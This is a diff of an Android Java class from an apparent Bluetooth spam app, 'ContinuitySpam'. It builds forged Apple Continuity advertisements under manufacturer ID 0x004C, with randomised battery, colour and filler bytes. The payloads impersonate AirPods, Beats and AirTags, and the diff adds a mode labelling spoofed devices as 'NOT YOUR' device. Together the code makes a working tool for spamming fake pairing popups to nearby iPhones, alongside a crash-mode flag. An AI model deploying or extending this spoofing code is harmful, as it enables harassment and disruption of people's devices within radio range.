@@ -1,11 +1,13 @@
 package com.tutozz.blespam;
 
 import android.bluetooth.le.AdvertiseData;
+import android.os.Build;
 
+import java.util.HashMap;
+import java.util.Map;
 import java.util.Random;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
-
 public class ContinuitySpam implements Spammer {
     public Runnable blinkRunnable;
     public ContinuityDevice[] devices;
@@ -14,24 +16,81 @@ public class ContinuitySpam implements Spammer {
     public boolean crashMode;
     ExecutorService executor = Executors.newSingleThreadExecutor();
 
-    // AirTag-specific data
-    private static final String[] AIRTAG_DEVICE_IDS = {"0055", "0030"};
-    private static final String[] AIRTAG_DEVICE_NAMES = {"Airtag", "Hermes Airtag"};
-    private static final String COLOR_KEY = "00"; // White color for AirTags
-    private static final int AIRTAG_PAYLOAD_SIZE = 25; // 0x19
-    private static final String AIRTAG_STATUS = "55";
+    private final Random rand = new Random();
+
+    private static final String COLOR_KEY_DEFAULT = "00"; // fallback
+    private static final String CONTINUITY_TYPE = "07";
+    private static final String PAYLOAD_SIZE = "19";
+    private static final String STATUS = "55";
+
+    private static final Map<String, String[]> DEVICE_COLORS = new HashMap<>();
+    static {
+        // white
+        DEVICE_COLORS.put("0E20", new String[] { "00" });
+        DEVICE_COLORS.put("0220", new String[] { "00" });
+        DEVICE_COLORS.put("0F20", new String[] { "00" });
+        DEVICE_COLORS.put("1320", new String[] { "00" });
+        DEVICE_COLORS.put("1420", new String[] { "00" });
+        // airpods max
+        DEVICE_COLORS.put("0A20", new String[] { "00","02","03","0F","11" });
+        // beats flex
+        DEVICE_COLORS.put("1020", new String[] { "00","01" });
+        // beats solo 3 (partial list from Kotlin)
+        DEVICE_COLORS.put("0620", new String[] {
+                "00","01","06","07","08","09","0E","0F","12","13","14","15","1D","20","21","22","23","25","2A","2E","3D","3E","3F","40","5B","5C"
+        });
+        // powerbeats 3
+        DEVICE_COLORS.put("0320", new String[] { "00","01","0B","0C","0D","12","13","14","15","17" });
+        // powerbeats pro
+        DEVICE_COLORS.put("0B20", new String[] { "00","02","03","04","05","06","0B","0D" });
+        // beats solo pro
+        DEVICE_COLORS.put("0C20", new String[] { "00","01" });
+        // beats studio buds
+        DEVICE_COLORS.put("1120", new String[] { "00","01","02","03","04","06" });
+        // beats x
+        DEVICE_COLORS.put("0520", new String[] { "00","01","02","05","1D","25" });
+        // beats studio 3 (partial)
+        DEVICE_COLORS.put("0920", new String[] { "00","01","02","03","18","19","25","26","27","28","29","42","43" });
+        // beats studio pro
+        DEVICE_COLORS.put("1720", new String[] { "00","01" });
+        // beats fit pro
+        DEVICE_COLORS.put("1220", new String[] { "00","01","02","03","04","05","06","07","08","09" });
+        // beats studio buds (alt)
+        DEVICE_COLORS.put("1620", new String[] { "00","01","02","03","04" });
+        // airtag-like (we can keep default color)
+        DEVICE_COLORS.put("0055", new String[] { "00" });
+        DEVICE_COLORS.put("0030", new String[] { "00" });
+    }
+
+    private static final Map<String, String> DEVICE_DATA = new HashMap<>();
+    static {
+        DEVICE_DATA.put("0E20", "AirPods Pro");
+        DEVICE_DATA.put("0A20", "AirPods Max");
+        DEVICE_DATA.put("0220", "AirPods");
+        DEVICE_DATA.put("0F20", "AirPods 2nd Gen");
+        DEVICE_DATA.put("1320", "AirPods 3rd Gen");
+        DEVICE_DATA.put("1420", "AirPods Pro 2nd Gen");
+        DEVICE_DATA.put("1020", "Beats Flex");
+        DEVICE_DATA.put("0620", "Beats Solo 3");
+        DEVICE_DATA.put("0320", "Powerbeats 3");
+        DEVICE_DATA.put("0B20", "Powerbeats Pro");
+        DEVICE_DATA.put("0C20", "Beats Solo Pro");
+        DEVICE_DATA.put("1120", "Beats Studio Buds");
+        DEVICE_DATA.put("0520", "Beats X");
+        DEVICE_DATA.put("0920", "Beats Studio 3");
+        DEVICE_DATA.put("1720", "Beats Studio Pro");
+        DEVICE_DATA.put("1220", "Beats Fit Pro");
+        DEVICE_DATA.put("1620", "Beats Studio Buds+");
+    }
 
     public ContinuitySpam(ContinuityDevice.type type, boolean crashMode) {
         this.crashMode = crashMode;
-        // Init ContinuityDevices
         switch (type) {
             default:
             case DEVICE:
                 devices = new ContinuityDevice[]{
-                        new ContinuityDevice("0x0E20", "Custom AirPods Pro 1", ContinuityDevice.type.DEVICE),
-                        new ContinuityDevice("0x1420", "Custom AirPods Pro 2", ContinuityDevice.type.DEVICE),
-                        new ContinuityDevice("0x1420", "Custom AirPods Pro 3", ContinuityDevice.type.DEVICE),
-                        new ContinuityDevice("0x0E20", "Custom AirPods Pro 4", ContinuityDevice.type.DEVICE),
+                        new ContinuityDevice("0x0E20", "AirPods Pro 2 GEN", ContinuityDevice.type.DEVICE),
+                        new ContinuityDevice("0x1420", "AirPods Pro 1 GEN", ContinuityDevice.type.DEVICE),
                         new ContinuityDevice("0x0E20", "AirPods Pro", ContinuityDevice.type.DEVICE),
                         new ContinuityDevice("0x0620", "Beats Solo 3", ContinuityDevice.type.DEVICE),
                         new ContinuityDevice("0x0A20", "AirPods Max", ContinuityDevice.type.DEVICE),
@@ -52,6 +111,13 @@ public class ContinuitySpam implements Spammer {
                         new ContinuityDevice("0x1220", "Beats Fit Pro", ContinuityDevice.type.DEVICE),
                         new ContinuityDevice("0x1620", "Beats Studio Buds+", ContinuityDevice.type.DEVICE)
                 };
+                break;
+            case NOTYOURDEVICE:
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                    devices = DEVICE_DATA.entrySet().stream()
+                            .map(entry -> new ContinuityDevice("0x" + entry.getKey(), entry.getValue() + " (NOT YOUR)", ContinuityDevice.type.NOTYOURDEVICE))
+                            .toArray(ContinuityDevice[]::new);
+                }
                 break;
             case ACTION:
                 devices = new ContinuityDevice[]{
@@ -77,28 +143,61 @@ public class ContinuitySpam implements Spammer {
         }
     }
 
-    private String getRandomBudsBatteryLevel() {
-        int level = ((new Random().nextInt(10) << 4) + new Random().nextInt(10));
-        return String.format("%02X", level);
+    // --- HEX helpers ---
+    private String toHexByte(int b) {
+        return String.format("%02X", b & 0xFF);
     }
 
-    private String getRandomChargingCaseBatteryLevel() {
-        int level = ((new Random().nextInt(8) % 8) << 4) + (new Random().nextInt(10) % 10);
-        return String.format("%02X", level);
+    private String getRandomBudsBatteryLevelHex() {
+        int level = ((rand.nextInt(10) << 4) + rand.nextInt(10)) & 0xFF;
+        return toHexByte(level);
     }
 
-    private String getRandomLidOpenCounter() {
-        return String.format("%02X", new Random().nextInt(256));
+    private String getRandomChargingCaseBatteryLevelHex() {
+        int level = (((rand.nextInt(8) % 8) << 4) + (rand.nextInt(10) % 10)) & 0xFF;
+        return toHexByte(level);
     }
 
-    private String getRandomBytes(int length) {
-        byte[] bytes = new byte[length];
-        new Random().nextBytes(bytes);
-        StringBuilder hex = new StringBuilder();
-        for (byte b : bytes) {
-            hex.append(String.format("%02X", b & 0xFF));
+    private String getRandomLidOpenCounterHex() {
+        int counter = rand.nextInt(256);
+        return toHexByte(counter);
+    }
+
+    private String getRandomHexBytes(int length) {
+        byte[] b = new byte[length];
+        rand.nextBytes(b);
+        StringBuilder sb = new StringBuilder();
+        for (byte by : b) {
+            sb.append(String.format("%02X", by & 0xFF));
         }
-        return hex.toString();
+        return sb.toString();
+    }
+
+    private String pickRandomColorForDevice(String deviceIdNoPrefix) {
+        String[] arr = DEVICE_COLORS.get(deviceIdNoPrefix);
+        if (arr == null || arr.length == 0) return COLOR_KEY_DEFAULT;
+        return arr[rand.nextInt(arr.length)];
+    }
+
+    private String buildContinuityPayload(String prefixHex, String deviceIdHex, String colorHex) {
+        String buds = getRandomBudsBatteryLevelHex();
+        String charging = getRandomChargingCaseBatteryLevelHex();
+        String lid = getRandomLidOpenCounterHex();
+        if (colorHex == null || colorHex.isEmpty()) colorHex = COLOR_KEY_DEFAULT;
+
+        String payload = CONTINUITY_TYPE
+                + PAYLOAD_SIZE
+                + prefixHex
+                + deviceIdHex
+                + STATUS
+                + buds
+                + charging
+                + lid
+                + colorHex
+                + "00";
+
+        payload += getRandomHexBytes(16);
+        return payload;
     }
 
     public void start() {
@@ -107,8 +206,7 @@ public class ContinuitySpam implements Spammer {
             isSpamming = true;
             for (loop = 0; loop <= Helper.MAX_LOOP; loop++) {
                 if (isSpamming) {
-                    // Random device
-                    ContinuityDevice device = devices[new Random().nextInt(devices.length)];
+                    ContinuityDevice device = devices[rand.nextInt(devices.length)];
                     AdvertiseData data = null;
 
                     if (device.getDeviceType() == ContinuityDevice.type.ACTION) {
@@ -120,59 +218,38 @@ public class ContinuitySpam implements Spammer {
                         data = new AdvertiseData.Builder()
                                 .addManufacturerData(0x004C, Helper.convertHexToByteArray(manufacturerData))
                                 .build();
-                    } else if (device.getDeviceType() == ContinuityDevice.type.DEVICE) {
-                        String manufacturerData;
-                        if (device.getName().equals("Custom AirPods Pro 1")) {
-                            manufacturerData = "070F000E204142FD2C9A5B956464640400";
-                        } else if (device.getName().equals("Custom AirPods Pro 2")) {
-                            manufacturerData = "071301142075AA3733001000E4E407000000000000";
-                        } else if (device.getName().equals("Custom AirPods Pro 3")) {
-                            manufacturerData = "070F001420CC97AB7DD9BE95E4E4100500";
-                        } else if (device.getName().equals("Custom AirPods Pro 4")) {
-                            manufacturerData = "0719010E2071AA37370010D760E0789CF7D3DD4C8018F728B31C49";
-                        } else if (device.getName().equals("Airtag") || device.getName().equals("Hermes Airtag")) {
-                            // Improved AirTag logic
-                            String continuityType = "07"; // ProximityPair
-                            String payloadSize = "19"; // 25 bytes
-                            String prefix = "05"; // New AirTag
-                            String deviceId = device.getName().equals("Airtag") ? "0055" : "0030";
-                            manufacturerData = continuityType +
-                                    payloadSize +
-                                    prefix +
-                                    deviceId +
-                                    AIRTAG_STATUS +
-                                    getRandomBudsBatteryLevel() +
-                                    getRandomChargingCaseBatteryLevel() +
-                                    getRandomLidOpenCounter() +
-                                    COLOR_KEY +
-                                    "00" +
-                                    getRandomBytes(16);
-                        } else {
-                            // Original logic for other devices
-                            String continuityType = "07";
-                            String size = "19";
-                            String prefix = "01";
-                            if (device.getName().equals("Airtag")) prefix = "05"; // Fallback, not used
-                            String budsBatteryLevel = String.format("%02X", new Random().nextInt(10) * 10 + new Random().nextInt(10));
-                            String caseBatteryLevel = String.format("%02X", new Random().nextInt(8) * 10 + new Random().nextInt(10));
-                            String lidOpenCounter = String.format("%02X", new Random().nextInt(256));
-                            String filler = Helper.randomHexFiller(32);
-                            manufacturerData = continuityType + size + prefix + device.getValue() + "55" + budsBatteryLevel + caseBatteryLevel + lidOpenCounter + "0000" + filler;
-                        }
+
+                    } else if (device.getDeviceType() == ContinuityDevice.type.NOTYOURDEVICE) {
+                        // NOT YOUR DEVICE: prefix = "01", choose random color based on device id
+                        String deviceVal = device.getValue().replace("0x", "").replace("0X", "").toUpperCase();
+                        String color = pickRandomColorForDevice(deviceVal);
+                        String manufacturerData = buildContinuityPayload("01", deviceVal, color);
+
+                        data = new AdvertiseData.Builder()
+                                .addManufacturerData(0x004C, Helper.convertHexToByteArray(manufacturerData))
+                                .build();
+
+                    } else { // DEVICE
+                        String deviceVal = device.getValue().replace("0x", "").replace("0X", "").toUpperCase();
+                        // prefix = "07" (new device)
+                        String manufacturerData = buildContinuityPayload("07", deviceVal, pickRandomColorForDevice(deviceVal));
                         data = new AdvertiseData.Builder()
                                 .addManufacturerData(0x004C, Helper.convertHexToByteArray(manufacturerData))
                                 .build();
                     }
+
                     // Advertise
                     b.advertise(data, null);
-                    // Wait before next advertise
+
+                    // Wait
                     try {
                         System.out.println(Helper.delay);
                         Thread.sleep(Helper.delay);
                     } catch (InterruptedException e) {
                         e.printStackTrace();
                     }
-                    // Stop this advertise to start the next one
+
+                    // Stop advertise (start next)
                     b.stopAdvertising();
                 }
             }
